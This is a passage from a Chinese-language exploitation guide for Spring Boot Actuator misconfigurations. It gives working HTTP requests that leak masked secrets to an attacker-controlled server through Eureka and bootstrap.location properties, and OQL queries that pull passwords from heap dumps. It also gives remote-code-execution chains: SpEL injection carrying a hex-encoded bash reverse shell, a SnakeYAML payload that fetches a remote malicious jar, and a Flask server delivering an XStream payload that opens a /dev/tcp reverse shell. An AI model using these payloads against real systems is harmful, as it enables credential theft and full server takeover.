class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><ul><li>调用其他 Mbean</li></ul><blockquote><p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p></blockquote><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><ul><li>可以 GET 请求目标网站的 <code>/env</code> </li><li>可以 POST 请求目标网站的 <code>/env</code> </li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p><p>访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p><p><strong>步骤二： 使用 nc 监听 HTTP 请求</strong></p><p>在自己控制的外网服务器上监听 80 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 80</span><br></pre></td></tr></table></figure><p><strong>步骤三：  触发对外 http 请求</strong></p><p><code>eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</code>  </p><p><code>属性</code>替换为想要获取的目标属性</p><p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址</p><p><code>port</code>为前面监听的端口</p><ul><li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;属性&#125;@your-vps-ip:port&quot;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip:port/?=$&#123;属性&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip:port/?=$&#123;属性&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤四： 刷新配置</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>步骤五： 解码属性值</strong></p><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure><p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p><h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><h6 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h6><ul><li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li></ul><h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p><p>访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p><p><strong>步骤二:下载 jvm heap 信息</strong></p><blockquote><p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p></blockquote><p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p><p><strong>步骤三:使用 MAT 获得 jvm heap 中的密码明文</strong></p><p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure><p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p><h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><h4 id="2-1-whitelabel-error-page-SpEL-RCE"><a href="#2-1-whitelabel-error-page-SpEL-RCE" class="headerlink" title="2.1.whitelabel error page SpEL RCE"></a>2.1.whitelabel error page SpEL RCE</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><h5 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一: 找到目标网站正常传参点</strong></p><p>比如发现访问  <code>/xxxx?id=xxx</code> ，页面会报状态码为 500 的默认错误页面</p><p><strong>步骤二: 确认漏洞点</strong></p><p>输入 <code>/xxxx?id=$&#123;运算表达式&#125;</code> (假设运算表达式为7x7)</p><p>如果发现报错页面将 7x7 的值 49 计算出来并显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p><strong>步骤三: 命令执行漏洞利用</strong></p><p>运行代码将执行的命令字符串转换成 <code>0x**</code> java 字节形式(只需将target变量修改为需要执行的命令即可)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;执行的命令&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure><p>执行 <code>open -a Calculator</code> 命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//ip:port/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br></pre></td></tr></table></figure><h5 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h5><p>环境是上面的资源集合的springboot-spel-rce，环境搭建参照上方</p><p>在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章<a href="https://blog.csdn.net/weixin_44373935/article/details/90046451">点击这里</a>)</p><p>访问<a href="https://127.0.0.1:9091/article?id=$%7B7*7%7D">https://127.0.0.1:9091/article?id=${7*7}</a></p><p>可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210827133545079.png" alt="image-20210827133545079"></p><p>下面将花括号里面的修改成需要执行的命令</p><p>首先要将命令字符串转换为java字节形式，利用上面的python脚本</p><p>这里执行的命令为bash反弹shell，先将其进行base64编码转换(<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线转换地址</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp; /dev/tcp/192.168.233.243/9090  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">转换后:</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>在将其转换为java字节</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210827151659784.png" alt="image-20210827151659784"></p><p>使用nc监听192.168.233.243的9090端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9090</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将转换后的java字节拼接到payload中，在浏览器中访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.243:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x38,0x78,0x4f,0x54,0x49,0x75,0x4d,0x54,0x59,0x34,0x4c,0x6a,0x49,0x7a,0x4d,0x79,0x34,0x79,0x4e,0x44,0x4d,0x76,0x4f,0x54,0x41,0x35,0x4d,0x43,0x41,0x77,0x50,0x69,0x59,0x78,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x65,0x36,0x34,0x2c,0x2d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br></pre></td></tr></table></figure><p>反弹shell成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210827152313055.png" alt="image-20210827152313055"></p><h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><ol><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol><p>详细分析参见下文:</p><p>​    <a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p><h4 id="2-2Spring-clound-SnakeYAML-RCE"><a href="#2-2Spring-clound-SnakeYAML-RCE" class="headerlink" title="2.2Spring clound SnakeYAML RCE"></a>2.2Spring clound SnakeYAML RCE</h4><h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h5 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一</strong>: <strong>托管yml和jar文件</strong></p><blockquote><p>首先在自己的机器上开启个python的http服务(或者使用apache和nginx)，然后将yml文件(访问jar包)和jar包放在根目录下，便于访问</p></blockquote><p>在根目录下放置yml文件，内容如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://your-ip-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p><p><strong>步骤二： 设置 spring.cloud.bootstrap.location 属性</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三： 刷新配置</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-1"><a href="#利用实例-1" class="headerlink" title="利用实例"></a><strong>利用实例</strong></h5><p>这里使用的是python开启http服务。当使用python开启http服务时，根目录为当前执行命令的目录，所以先把yml和jar包放置到根目录下在执行python命令开启http服务</p><p>在根目录下放置yml文件，内容如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://192.168.233.243/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p><p>(代码也在网盘里面，为springcloud-snakeyaml-rce/yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java)</p><p>只需将exec()里面修改为执行的命令即可</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210827163442633.png" alt="image-20210827163442633"></p><p>将其进行打包成jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf example.jar -C src/ .</span><br></pre></td></tr></table></figure><p>使用python快速开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>通过burp抓包并修改请求报文</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210829225702843.png" alt="image-20210829225702843"></p><p>然后修改请求报文/refresh，刷新配置文件</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210829230055895.png" alt="image-20210829230055895"></p><p>反弹shell成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210829230223141.png" alt="image-20210829230223141"></p><h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><p>分析详情参见下文</p><p><a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p><h4 id="2-3-Eureka服务漏洞"><a href="#2-3-Eureka服务漏洞" class="headerlink" title="2.3.Eureka服务漏洞"></a><strong>2.3.Eureka服务漏洞</strong></h4><p>Eureka服务漏洞需要存在两个包</p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring-boot-starter-actuator（/refresh刷新配置需要）  </span><br><span class="line">spring-cloud-starter-netflix-eureka-client（功能依赖）</span><br></pre></td></tr></table></figure></blockquote><h5 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><blockquote><p>  Eureka-Client&lt;1.8.7，eureka服务多用于netflix组件中，可通过在&lt;<br>  span=””&gt;/env中搜寻Netflix关键字判断时候可能存在Eureka服务</p></blockquote><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/7af2a3cf6a49f6b649e1aacbeb4aacf7.png"></p><p>Eureka服务属性被设置为恶意的外部Eureka server<br>URL地址时，通过/refresh会触发目标机器请求远程URL,Eureka server<br>URL可通过在/env处POST数据进行更改</p><h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:  架设响应Xstream payload的网站</strong></p><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><p><strong>步骤二：监听反弹 shell 的端口</strong></p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure><p><strong>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤四：刷新配置</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-2"><a href="#利用实例-2" class="headerlink" title="利用实例"></a>利用实例</h5><p>使用python 在服务器上搭建一个响应XStream payload的Web服务，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>)@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span>    </span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    </span></span><br><span class="line"><span class="string">&lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        </span></span><br><span class="line"><span class="string">&lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          </span></span><br><span class="line"><span class="string">&lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            </span></span><br><span class="line"><span class="string">&lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    </span></span><br><span class="line"><span class="string">&lt;command&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;-c&lt;/string&gt;                      </span></span><br><span class="line"><span class="string">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.233.247/1234 0&gt;&amp;amp;1&lt;/string&gt;                    </span></span><br><span class="line"><span class="string">&lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                </span></span><br><span class="line"><span class="string">&lt;/iter&gt;                </span></span><br><span class="line"><span class="string">&lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    </span></span><br><span class="line"><span class="string">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    </span></span><br><span class="line"><span class="string">&lt;parameter-types/&gt;                 </span></span><br><span class="line"><span class="string"> &lt;/method&gt;                  </span></span><br><span class="line"><span class="string">&lt;name&gt;foo&lt;/name&gt;                </span></span><br><span class="line"><span class="string">&lt;/filter&gt;                </span></span><br><span class="line"><span class="string">&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;             </span></span><br><span class="line"><span class="string"> &lt;/serviceIterator&gt;              </span></span><br><span class="line"><span class="string">&lt;lock/&gt;            </span></span><br><span class="line"><span class="string">&lt;/cipher&gt;            </span></span><br><span class="line"><span class="string">&lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          </span></span><br><span class="line"><span class="string">&lt;/is&gt;        </span></span><br><span class="line"><span class="string">&lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">&lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span>    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Python3启动web,如下:</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/7622e80d3286c478d7fdf42a216d67d4.png"></p><p>使用Burp构造请求报文发送POST请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://192.168.233.249/xstream</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/85864c908118a436d542c5dfc3fedba5.png"></p><p>刷新配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br></pre></td></tr></table></figure><p><img 